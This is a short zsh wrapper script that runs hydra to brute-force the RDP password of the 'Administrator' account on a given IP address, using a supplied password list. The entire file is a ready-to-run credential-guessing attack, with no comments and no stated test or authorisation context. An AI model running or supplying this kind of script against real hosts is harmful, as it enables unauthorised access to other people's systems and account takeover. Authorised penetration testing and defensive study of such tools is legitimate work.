#!/usr/bin/zsh
if [[ $# -ne 2 ]]; then
    echo "ERR: Need two arguments"
    echo "Usage: $0 <destination IP> <password file>"
    exit 2
fi
echo "Initiating... please wait"
hydra -t 4 -V -f -l Administrator -P $2 rdp://$1
